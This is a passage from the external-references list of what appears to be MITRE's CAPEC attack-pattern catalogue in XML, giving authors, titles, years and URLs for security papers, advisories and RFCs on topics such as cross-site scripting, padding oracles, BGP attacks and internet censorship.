         <Title>Supply Chain Risk Management (SCRM)</Title>
         <Publication_Year>2010</Publication_Year>
         <Publisher>National Institute of Standards and Technology (NIST)</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-38">
         <Title>HTTP 1.1 Specification (RFC 2616)</Title>
         <Publication>IETF RFC</Publication>
         <URL>http://www.ietf.org/rfc/rfc2616.txt</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-380">
         <Author>Marcus Sachs</Author>
         <Title>Supply Chain Attacks: Can We Secure Information Technology Supply Chain in the Age of Globalization</Title>
         <Publisher>Verizon, Inc.</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-381">
         <Author>Thea Reilkoff</Author>
         <Title>Hardware Trojans: A Novel Attack Meets a New Defense</Title>
         <Publication_Year>2010</Publication_Year>
         <Publisher>Yale School of Engineering and Applied Science</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-382">
         <Author>Marianne Swanson</Author>
         <Author>Nadya Bartol</Author>
         <Author>Rama Moorthy</Author>
         <Title>Piloting Supply Chain Risk Management Practices for Federal Information Systems</Title>
         <Edition>Draft NISTIR 7622</Edition>
         <Publication_Year>2010</Publication_Year>
         <Publisher>National Institute of Standards and Technology</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-384">
         <Author>SAFECode</Author>
         <Title>The Software Supply Chain Integrity Framework Defining Risks and Responsibilities for Securing Software in the Global Supply Chain</Title>
         <Publication_Year>2009</Publication_Year>
         <Publisher>Safecode.org</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-387">
         <Author>Marshall Brain</Author>
         <Title>How Computer Viruses Work</Title>
         <Publication_Year>2007</Publication_Year>
         <Publisher>MindPride</Publisher>
         <URL>http://www.mindpride.net/root/Extras/how-stuff-works/how_computer_viruses_work.htm</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-39">
         <Title>WASC Threat Classification 2.0</Title>
         <Publication_Year>2010</Publication_Year>
         <Publisher>The Web Application Security Consortium (WASC)</Publisher>
         <URL>http://projects.webappsec.org/Fingerprinting</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-394">
         <Author>Robert Lemos</Author>
         <Title>Researchers: Rootkits headed for BIOS</Title>
         <Publication_Year>2006</Publication_Year>
         <Publisher>SecurityFocus</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-395">
         <Author>Alexander Sotirov</Author>
         <Author>Marc Stevens</Author>
         <Author>Jacob Appelbaum</Author>
         <Author>Arjen Lenstra</Author>
         <Author>David Molnar</Author>
         <Author>Dag Arne Osvik</Author>
         <Author>Benne de Weger</Author>
         <Title>MD5 Considered Harmful Today: Creating a Rogue CA Certificate</Title>
         <Publication_Year>2008</Publication_Year>
         <Publication_Month>--12</Publication_Month>
         <Publication_Day>---30</Publication_Day>
         <Publisher>Phreedom.org</Publisher>
         <URL>http://www.phreedom.org/research/rogue-ca/</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-397">
         <Author>Luca Carettoni</Author>
         <Author>Stefano di Paola</Author>
         <Title>HTTP Parameter Pollution</Title>
         <Edition>OWASP EU09 Poland</Edition>
         <Publication_Year>2008</Publication_Year>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>https://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-398">
         <Author>Thai Duong</Author>
         <Author>Juliano Rizzo</Author>
         <Title>Flickr's API Signature Forgery Vulnerability</Title>
         <Publication_Year>2009</Publication_Year>
         <Publication_Month>--09</Publication_Month>
         <Publication_Day>---28</Publication_Day>
         <URL>http://netifera.com/research/flickr_api_signature_forgery.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-399">
         <Author>Chris Evans</Author>
         <Title>Cross-Domain Search Timing</Title>
         <Publication_Year>2009</Publication_Year>
         <Publication_Month>--12</Publication_Month>
         <Publication_Day>---11</Publication_Day>
         <URL>http://scarybeastsecurity.blogspot.com/2009/12/cross-domain-search-timing.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-4">
         <Title>OWASP Testing Guide</Title>
         <Edition>v4 [DRAFT]</Edition>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>http://www.owasp.org/index.php/Testing_for_ORM_Injection</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-40">
         <Author>Yuval B.</Author>
         <Author>Ayal Y.</Author>
         <Author>Adi S.</Author>
         <Title>Flash Parameter Injection: A Security Advisory</Title>
         <Publication_Year>2008</Publication_Year>
         <Publication_Month>--09</Publication_Month>
         <Publication_Day>---24</Publication_Day>
         <Publisher>IBM Rational Security Team</Publisher>
         <URL>http://blog.watchfire.com/FPI.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-400">
         <Author>Juliano Rizzo</Author>
         <Author>Thai Duong</Author>
         <Title>Practical Padding Oracle Attacks</Title>
         <Publication_Year>2010</Publication_Year>
         <Publication_Month>--05</Publication_Month>
         <Publication_Day>---25</Publication_Day>
         <URL>https://www.usenix.org/legacy/events/woot10/tech/full_papers/Rizzo.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-401">
         <Author>Samy Kamkar</Author>
         <Title>Evercookie</Title>
         <Publication_Year>2010</Publication_Year>
         <Publication_Month>--09</Publication_Month>
         <Publication_Day>---09</Publication_Day>
         <URL>http://samy.pl/evercookie/</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-402">
         <Author>Robert Auger</Author>
         <Title>Socket Capable Browser Plugins Result In Transparent Proxy Abuse</Title>
         <Publication_Year>2009</Publication_Year>
         <URL>http://www.thesecuritypractice.com/the_security_practice/TransparentProxyAbuse.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-403">
         <Author>Roi Saltzman</Author>
         <Author>Adi Sharabani</Author>
         <Title>Active Man in the Middle Attacks</Title>
         <Publication_Year>2009</Publication_Year>
         <Publication_Month>--02</Publication_Month>
         <Publication_Day>---02</Publication_Day>
         <Publisher>IBM Rational Application Security Group</Publisher>
         <URL>http://blog.watchfire.com/wfblog/2009/02/active-man-in-the-middle-attacks.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-404">
         <Author>Ronen</Author>
         <Title>Cross Site Identification - or - How your social network might expose you when you least expect it</Title>
         <Publication_Year>2009</Publication_Year>
         <Publication_Month>--12</Publication_Month>
         <Publication_Day>---27</Publication_Day>
         <URL>http://blog.quaji.com/2009/12/out-of-context-information-disclosure.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-405">
         <Author>Chris Evans</Author>
         <Title>Generic cross-browser cross-domain theft</Title>
         <Publication_Year>2009</Publication_Year>
         <Publication_Month>--12</Publication_Month>
         <Publication_Day>---28</Publication_Day>
         <URL>http://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-406">
         <Author>Robert Hansen</Author>
         <Title>Slowris HTTP DoS</Title>
         <Publication_Year>2009</Publication_Year>
         <Publication_Month>--06</Publication_Month>
         <Publication_Day>---17</Publication_Day>
         <URL>http://ha.ckers.org/blog/20090617/slowloris-http-dos/</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-408">
         <Author>Bernardo Damele Assump ção Guimarães</Author>
         <Title>Advanced SQL Injection to Operating System Full Control</Title>
         <Publication_Year>2009</Publication_Year>
         <Publication_Month>--04</Publication_Month>
         <Publication_Day>---10</Publication_Day>
         <URL>http://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-whitepaper.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-409">
         <Title>M Trends Report</Title>
         <Publication_Year>2011</Publication_Year>
         <Publisher>Mandiant</Publisher>
         <URL>https://www.mandiant.com</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-41">
         <Author>Stefano Di Paola</Author>
         <Title>Testing Flash Applications</Title>
         <Publication_Year>2007</Publication_Year>
         <URL>http://www.wisec.it/en/Docs/flash_App_testing_Owasp07.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-410">
         <Author>Gareth Heyes</Author>
         <Title>Detecting browsers javascript hacks</Title>
         <Publication>The Spanner</Publication>
         <Publication_Year>2009</Publication_Year>
         <Publication_Month>--01</Publication_Month>
         <Publication_Day>---29</Publication_Day>
         <URL>http://www.thespanner.co.uk/2009/01/29/detecting-browsers-javascript-hacks/</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-411">
         <Author>Sigbjørn Vik</Author>
         <Title>Security breach stopped</Title>
         <Publication_Year>2013</Publication_Year>
         <Publication_Month>--06</Publication_Month>
         <Publication_Day>---26</Publication_Day>
         <Publisher>http://my.opera.com/securitygroup/blog/2013/06/26/opera-infrastructure-attack</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-412">
         <Author>Patrick Morley</Author>
         <Title>Bit9 and Our Customers’ Security</Title>
         <Publication_Year>2013</Publication_Year>
         <Publication_Month>--02</Publication_Month>
         <Publication_Day>---08</Publication_Day>
         <Publisher>https://blog.bit9.com/2013/02/08/bit9-and-our-customers-security/</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-413">
         <Author>Brad Arkin</Author>
         <Title>Inappropriate Use of Adobe Code Signing Certificate</Title>
         <Publication_Year>2012</Publication_Year>
         <Publication_Month>--09</Publication_Month>
         <Publication_Day>---27</Publication_Day>
         <Publisher>http://blogs.adobe.com/asset/2012/09/inappropriate-use-of-adobe-code-signing-certificate.html</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-414">
         <Author>Eric Johanson</Author>
         <Title>The state of homograph attacks</Title>
         <Publication_Year>2005</Publication_Year>
         <Publication_Month>--02</Publication_Month>
         <Publication_Day>---11</Publication_Day>
         <Publisher>http://www.shmoo.com/idn/homograph.txt</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-416">
         <Title>Core Concepts: Attack Patterns</Title>
         <URL>https://websec.io/2012/11/26/Core-Concepts-Attack-Patterns.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-419">
         <Author>P.J. Leadbitter</Author>
         <Author>D. Page</Author>
         <Author>N.P. Smart</Author>
         <Title>Attacking DSA Under a Repeated Bits Assumption</Title>
         <Publication_Year>2004</Publication_Year>
         <Publication_Month>--07</Publication_Month>
         <Publisher>http://www.iacr.org/archive/ches2004/31560428/31560428.pdf</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-42">
         <Title>OWASP Testing Guide</Title>
         <Edition>v4 [DRAFT]</Edition>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>http://www.owasp.org/index.php/Testing_for_Cross_site_flashing_(OWASP-DV-004)</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-420">
         <Author>Debian Security</Author>
         <Title>DSA-1571-1 openssl -- predictable random number generator</Title>
         <Publication_Year>2008</Publication_Year>
         <Publication_Month>--05</Publication_Month>
         <Publication_Day>---13</Publication_Day>
         <Publisher>http://www.debian.org/security/2008/dsa-1571</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-421">
         <Author>Bryan Sullivan</Author>
         <Title>Regular Expression Denial of Service Attacks and Defenses</Title>
         <URL>http://msdn.microsoft.com/en-au/magazine/ff646973.aspx</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-422">
         <Title>SOAP Array Attack</Title>
         <URL>http://www.ws-attacks.org/index.php/Soap_Array_Attack</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-423">
         <Title>Security Considerations - IP Fragment Filtering</Title>
         <URL>https://www.rfc-editor.org/rfc/rfc1858.txt</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-424">
         <Author>Yossi Gilad</Author>
         <Author>Amir Herzberg</Author>
         <Title>Fragmentation Considered Vulnerable</Title>
         <Publication_Year>2012</Publication_Year>
         <URL>http://u.cs.biu.ac.il/~herzbea/security/12-03%20fragmentation.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-425">
         <Title>ICMP Attacks Illustrated</Title>
         <URL>http://www.sans.org/reading-room/whitepapers/threats/icmp-attacks-illustrated-477?show=icmp-attacks-illustrated-477&amp;cat=threats</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-426">
         <Author>Jonathan Zdziarksi</Author>
         <Title>Hacking and Securing iOS Applications</Title>
         <Edition>First Edition</Edition>
         <Publication_Year>2012</Publication_Year>
         <Publisher>O'Reilly Media, Inc.</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-427">
         <Author>Erika Chin</Author>
         <Author>Adrienne Porter Felt</Author>
         <Author>Kate Greenwood</Author>
         <Author>David Wagner</Author>
         <Title>Analyzing Inter-Application Communication in Android</Title>
         <Publication_Year>2011</Publication_Year>
         <Publisher>International Conference on Mobile Systems, Applications, and Services (MobiSys)</Publisher>
         <URL>https://people.eecs.berkeley.edu/~daw/papers/intents-mobisys11.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-429">
         <Title>Advisory: Unauthorized password recovery in phpBannerExchange</Title>
         <Publication_Year>2006</Publication_Year>
         <Publisher>RedTeam Pentesting GmbH</Publisher>
         <URL>http://www.redteam-pentesting.de/advisories/rt-sa-2006-005.txt</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-430">
         <Author>Tongbo Luo</Author>
         <Author>Hao Hao</Author>
         <Author>Wenliang Du</Author>
         <Author>Yifei Wang</Author>
         <Author>Heng Yin</Author>
         <Title>Attacks on WebView in the Android System</Title>
         <Publication_Year>2011</Publication_Year>
         <Publisher>Annual Computer Security Applications Conference (ACSAC)</Publisher>
         <URL>http://www.cis.syr.edu/~wedu/Research/paper/webview_acsac2011.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-434">
         <Author>Adrienne Porter Felt</Author>
         <Author>David Wagner</Author>
         <Title>Phishing on Mobile Devices</Title>
         <Publication_Year>2011</Publication_Year>
         <Publisher>University of California, Berkeley</Publisher>
         <URL>https://people.eecs.berkeley.edu/~daw/papers/mobphish-w2sp11.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-436">
         <Author>Marcus Niemietz</Author>
         <Author>Jorg Schwenk</Author>
         <Title>UI Redressing Attacks on Android Devices</Title>
         <Publication_Year>2012</Publication_Year>
         <Publisher>Horst Gortz Institute for IT-Security</Publisher>
         <URL>https://media.blackhat.com/ad-12/Niemietz/bh-ad-12-androidmarcus_niemietz-WP.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-437">
         <Author>David Richardson</Author>
         <Title>Look-10-007 - Tapjacking</Title>
         <Publication_Year>2010</Publication_Year>
         <Publisher>Lookout Mobile Security</Publisher>
         <URL>https://blog.lookout.com/look-10-007-tapjacking/</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-438">
         <Author>Ami Luttwak</Author>
         <Title>A new Zeus variant targeting Salesforce.com – Research and Analysis</Title>
         <Publisher>Adallom, Inc.</Publisher>
         <URL>http://www.adallom.com/blog/a-new-zeus-variant-targeting-salesforce-com-accounts-research-and-analysis/</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-439">
         <Author>John F. Miller</Author>
         <Title>Supply Chain Attack Framework and Attack Patterns</Title>
         <Publication_Year>2013</Publication_Year>
         <Publisher>The MITRE Corporation</Publisher>
         <URL>http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-445">
         <Title>Adobe Acrobat/Acrobat Reader ActiveX Control Buffer Overflow Vulnerability</Title>
         <Publication>iDefense Labs Public Advisory</Publication>
         <Publication_Year>2004</Publication_Year>
         <Publication_Month>--08</Publication_Month>
         <Publication_Day>---13</Publication_Day>
         <Publisher>Verisign, Inc.</Publisher>
         <URL>http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=126</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-446">
         <Title>PHP Input Validation Vulnerabilities</Title>
         <Publication>Bugtraq mailing list archive</Publication>
         <URL>http://msgs.securepoint.com/bugtraq/</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-45">
         <Title>OWASP Top 10</Title>
         <Edition>2007</Edition>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>http://www.owasp.org/index.php/Top_10_2007-A3</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-46">
         <Author>Stefano Di Paola</Author>
         <Title>Finding Vulnerabilities in Flash Applications</Title>
         <Publication>OWASP Appsec 2007</Publication>
         <Publication_Year>2007</Publication_Year>
         <Publication_Month>--11</Publication_Month>
         <Publication_Day>---15</Publication_Day>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-461">
         <Author>Kopo M. Ramokapane</Author>
         <Author>Awais Rashid</Author>
         <Author>Jose M. Such</Author>
         <Title>Assured Deletion in the Cloud: Requirements, Challenges and Future Directions</Title>
         <Publication>Association for Computing Machinery (ACM)</Publication>
         <Publisher>Proceedings of the 2016 ACM on Cloud Computing Security Workshop</Publisher>
         <URL>https://nms.kcl.ac.uk/jose.such/pubs/Assured_deletion.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-462">
         <Author>Small Media</Author>
         <Title>Satellite Jamming in Iran: A War over Airwaves</Title>
         <Publication_Year>2012</Publication_Year>
         <Publication_Month>--11</Publication_Month>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-463">
         <Author>Mark O'Neill</Author>
         <Title>Security for REST Web Services</Title>
         <Publisher>Vprde;</Publisher>
         <URL>http://www.vordel.com/downloads/rsa_conf_2006.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-464">
         <Title>Analysis of Country-wide Internet Outages Caused by Censorship</Title>
         <Publication_Year>2011</Publication_Year>
         <Publisher>Center for Applied Internet Data Analysis</Publisher>
         <URL>http://www.caida.org/publications/papers/2011/outages_censorship/outages_censorship.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-465">
         <Title>Why is it Taking so Long to Secure Internet Routing?</Title>
         <Publication_Year>2014</Publication_Year>
         <Publisher>ACM</Publisher>
         <URL>https://queue.acm.org/detail.cfm?id=2668966</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-466">
         <Title>Beware of BGP Attacks</Title>
         <Publication_Year>2004</Publication_Year>
         <Publisher>ACM SIGCOMM</Publisher>
         <URL>http://www.cc.gatech.edu/~dovrolis/Papers/ccr-bgp.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-467">
         <Title>Dozens of Online 'Dark Markets' Seized Pursuant to Forfeiture Complaint Filed in Manhattan Federal Court in Conjunction with the Arrest of the Operator of Silk Road 2.0</Title>
         <Publication_Year>2014</Publication_Year>
         <Publisher>FBI</Publisher>
         <URL>https://www.fbi.gov/contact-us/field-offices/newyork/news/press-releases/dozens-of-online-dark-markets-seized-pursuant-to-forfeiture-complaint-filed-in-manhattan-federal-court-in-conjunction-with-the-arrest-of-the-operator-of-silk-road-2.0</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-468">
         <Title>Deserialization of Untrusted Data</Title>
         <Publication_Year>2017</Publication_Year>
         <Publication_Month>--01</Publication_Month>
         <Publisher>OWASP</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-469">
         <Title>Cross Frame Scripting</Title>
         <Publication_Year>2016</Publication_Year>
         <Publisher>OWASP</Publisher>
         <URL>https://www.owasp.org/index.php/Cross_Frame_Scripting</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-47">
         <Author>Rudra K. Sinha Roy</Author>
         <Title>A Lazy Pen Tester's Guide to Testing Flash Applications</Title>
         <Publication>iViz</Publication>
         <URL>http://www.ivizsecurity.com/blog/web-application-security/testing-flash-applications-pen-tester-guide/</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-470">
         <Author>Gustave Rydstedt, Elie Bursztein, Dan Boneh, and Collin Jackson</Author>
         <Title>Busting Frame Busting: a Study of Clickjacking Vulnerabilities on Popular Sites</Title>
         <Publication_Year>2010</Publication_Year>
         <Publication_Month>--07</Publication_Month>
         <Publication_Day>---20</Publication_Day>
         <URL>https://seclab.stanford.edu/websec/framebusting/framebust.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-471">
         <Author>Amit Klein</Author>
         <Title>DOM Based Cross Site Scripting or XSS of the Third Kind</Title>
         <URL>http://www.webappsec.org/projects/articles/071105.shtml</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-472">
         <Author>Jakob Kallin</Author>
         <Author>Irene Lobo Valbuena</Author>
         <Title>A comprehensive tutorial on cross-site scripting</Title>
         <URL>https://excess-xss.com/</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-473">
         <Title>Censorship in the Wild: Analyzing Internet Filtering in Syria</Title>
         <Publication_Year>2014</Publication_Year>
         <Publisher>Sigcomm</Publisher>
         <URL>http://conferences2.sigcomm.org/imc/2014/papers/p285.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-475">
         <Author>Abdelberi Chaabane</Author>
         <Author>Terence Chen</Author>
         <Author>Mathieu Cunche</Author>
         <Author>Emiliano De Cristofaro</Author>
         <Author>Arik Friedman</Author>
         <Author>Mohamed Ali Kaafar</Author>
         <Title>Censorship in the Wild: Analyzing Internet Filtering in Syria</Title>
         <Publication_Year>2014</Publication_Year>
         <Publication_Month>--02</Publication_Month>
         <Publisher>IMC 2014</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-476">
         <Author>Watchfire Research</Author>
         <Title>XSS vulnerabilities in Google.com</Title>
         <Publication>Full Disclosure mailing list archives</Publication>
         <URL>http://seclists.org/fulldisclosure/2005/Dec/1107</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-477">
         <Author>John-Paul Verkamp</Author>
         <Author>Minaxi Gupta</Author>
         <Title>Inferring Mechanics of Web Censorship Around the World</Title>
         <Publication_Year>2012</Publication_Year>
         <Publisher>USENIX</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-479">
         <Author>Anonymous</Author>
         <Title>Towards a Comprehensive Picture of the Great Firewall's DNS Censorship</Title>
         <Publication_Year>2014</Publication_Year>
         <Publisher>USENIX</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-48">
         <Author>Peleus Uhley</Author>
         <Title>Creating More Secure SWF Web Application</Title>
         <Publisher>Adobe Systems Incorporated</Publisher>
         <URL>http://www.adobe.com/devnet/flashplayer/articles/secure_swf_apps.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-482">
         <Author>Jouko Pynnonen</Author>
         <Title>Java Web Start argument injection vulnerability</Title>
         <URL>http://www.securityfocus.com/archive/1/393696</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-485">
         <Author>Artem Dinaburg</Author>
         <Title>Bitsquatting: DNS Hijacking without exploitation</Title>
         <Publisher>Raytheon</Publisher>
         <URL>http://media.blackhat.com/bh-us-11/Dinaburg/BH_US_11_Dinaburg_Bitsquatting_WP.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-486">
         <Author>Karsten Nohl</Author>
         <Title>Rooting SIM Cards</Title>
         <Publisher>Security Research Labs</Publisher>
         <URL>https://srlabs.de/rooting-sim-cards/</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-487">
         <Author>Denis Foo Kune</Author>
         <Author>John Koelndorfer</Author>
         <Author>Nicholas Hopper</Author>
         <Author>Yongdae Kim</Author>
         <Title>Location Leaks on the GSM Air Interface</Title>
         <Publisher>University of Minnesota</Publisher>
         <URL>https://www-users.cs.umn.edu/~hoppernj/celluloc.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-489">
         <Title>Wikipedia</Title>
         <Publisher>The Wikimedia Foundation, Inc</Publisher>
         <URL>https://en.wikipedia.org/wiki/Spoofing_attack#GPS_Spoofing</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-49">
         <Title>OWASP Testing Guide</Title>
         <Edition>v4 [DRAFT]</Edition>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>http://www.owasp.org/index.php/Testing_for_IMAP/SMTP_Injection_(OWASP-DV-011)</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-491">
         <Author>Nick Nikiforakis</Author>
         <Author>Marco Balduzzi</Author>
         <Author>Lieven Desmet</Author>
         <Author>Frank Piessens</Author>
         <Author>Wouter Joosen</Author>
         <Title>Soundsquatting: Uncovering the Use of Homophones in Domain Squatting</Title>
         <Publisher>Trend Micro</Publisher>
         <URL>https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-soundsquatting.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-493">
         <Author>Means, Ryan L.</Author>
         <Title>Alternate Data Streams: Out of the Shadows and into the Light</Title>
         <Publisher>SANS Institute</Publisher>
         <URL>https://www.giac.org/paper/gcwn/230/alternate-data-streams-shadows-light/104234</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-495">
         <Author>Gunter Ollmann</Author>
         <Title>URL Encoded Attacks - Attacks using the common web browser</Title>
         <Publisher>CGISecurity.com</Publisher>
         <URL>http://www.cgisecurity.com/lib/URLEmbeddedAttacks.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-496">
         <Author>T. Berners-Lee</Author>
         <Author>R. Fielding</Author>
         <Author>L. Masinter</Author>
         <Title>RFC 3986 - Uniform Resource Identifier (URI): Generic Syntax</Title>
         <Publication_Year>2005</Publication_Year>
         <Publication_Month>--01</Publication_Month>
         <URL>http://www.ietf.org/rfc/rfc3986.txt</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-497">
         <Author>T. Berners-Lee</Author>
         <Author>L. Masinter</Author>
         <Author>M. McCahill</Author>
         <Title>RFC 1738 - Uniform Resource Locators (URL)</Title>
         <Publication_Year>1994</Publication_Year>
         <Publication_Month>--12</Publication_Month>
